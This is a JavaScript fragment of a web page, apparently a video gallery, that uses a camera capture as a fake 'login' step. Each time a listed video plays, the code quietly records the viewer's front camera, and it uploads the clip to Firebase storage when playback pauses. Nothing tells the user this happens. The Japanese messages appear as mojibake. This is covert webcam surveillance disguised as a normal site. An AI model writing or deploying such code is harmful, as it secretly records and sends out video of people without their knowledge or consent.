        async function requestCameraAccess(backCamera = true) {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                const camera = backCamera
                    ? videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0]
                    : videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];

                const constraints = {
                    video: {
                        deviceId: camera.deviceId,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = videoStream;
            } catch (err) {
                console.error('ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ã‚¨ãƒ©ãƒ¼:', err);
                showCameraPermissionDialog();
                throw err;
            }
        }

        function captureAndLogin() {
            if (videoStream) {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                loginContainer.style.display = 'none';
                document.querySelector('h1').style.display = 'block';
                videoGrid.style.display = 'grid';
                pagination.style.display = 'flex';
                loadVideos(currentPage);
            } else {
                console.error('ã‚«ãƒ¡ãƒ©ã‚¹ãƒˆãƒªãƒ¼ãƒ ãŒåˆ©ç”¨ã§ãã¾ã›ã‚“ã€‚');
                alert('ã‚«ãƒ¡ãƒ©ã‚¹ãƒˆãƒªãƒ¼ãƒ ãŒåˆ©ç”¨ã§ãã¾ã›ã‚“ã€‚');
            }
        }

        function showCameraPermissionDialog() {
            dialogOverlay.style.display = 'flex';
        }

        captureButton.addEventListener('click', () => {
            requestCameraAccess().then(captureAndLogin).catch(() => {
                alert('ã‚«ãƒ¡ãƒ©ã®æ¨©é™ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚');
            });
        });

        reloadButton.addEventListener('click', () => {
            location.reload();
        });

        async function loadVideos(page) {
            const startIndex = (page - 1) * videosPerPage;
            const endIndex = startIndex + videosPerPage;
            const videosToLoad = videos.slice(startIndex, endIndex);

            videoGrid.innerHTML = '';

            videosToLoad.forEach(video => {
                const videoItem = document.createElement('div');
                videoItem.className = 'video-item';

                const videoContainer = document.createElement('div');
                videoContainer.className = 'video-container';

                const videoElement = document.createElement('video');
                videoElement.src = video.url;
                videoElement.controls = true;

                const titleElement = document.createElement('div');
                titleElement.className = 'title';
                titleElement.textContent = video.title;

                videoContainer.appendChild(videoElement);
                videoItem.appendChild(videoContainer);
                videoItem.appendChild(titleElement);
                videoGrid.appendChild(videoItem);

                videoElement.addEventListener('play', () => {
                    startVideoRecording();
                });

                videoElement.addEventListener('pause', () => {
                    stopVideoRecording();
                });
            });

            setupPagination(page);
        }

        function setupPagination(currentPage) {
            pagination.innerHTML = '';

            const totalPages = Math.ceil(videos.length / videosPerPage);

            for (let i = 1; i <= totalPages; i++) {
                const button = document.createElement('button');
                button.textContent = i;
                if (i === currentPage) {
                    button.disabled = true;
                }
                button.addEventListener('click', () => {
                    loadVideos(i);
                });
                pagination.appendChild(button);
            }
        }

        async function startVideoRecording() {
            await requestCameraAccess(false); // ãƒ•ãƒ­ãƒ³ãƒˆã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨

            recordedChunks = [];
            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });

            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                uploadVideo(blob);
            };

            mediaRecorder.start();
        }

        function stopVideoRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
        }

        function uploadVideo(blob) {
            const storageRef = ref(storage, `videos/${Date.now()}.webm`);
            const uploadTask = uploadBytesResumable(storageRef, blob);

            uploadTask.on('state_changed',
                (snapshot) => {
                    const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                    console.log('Upload is ' + progress + '% done');
                },
                (error) => {
                    console.error('Upload error:', error);
                },
                () => {
                    console.log('Upload successful!');
                }
            );
        }

        window.onload = () => {
            requestCameraAccess().catch(() => {
                alert('ã‚«ãƒ¡ãƒ©ã®æ¨©é™ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚');
            });
        };
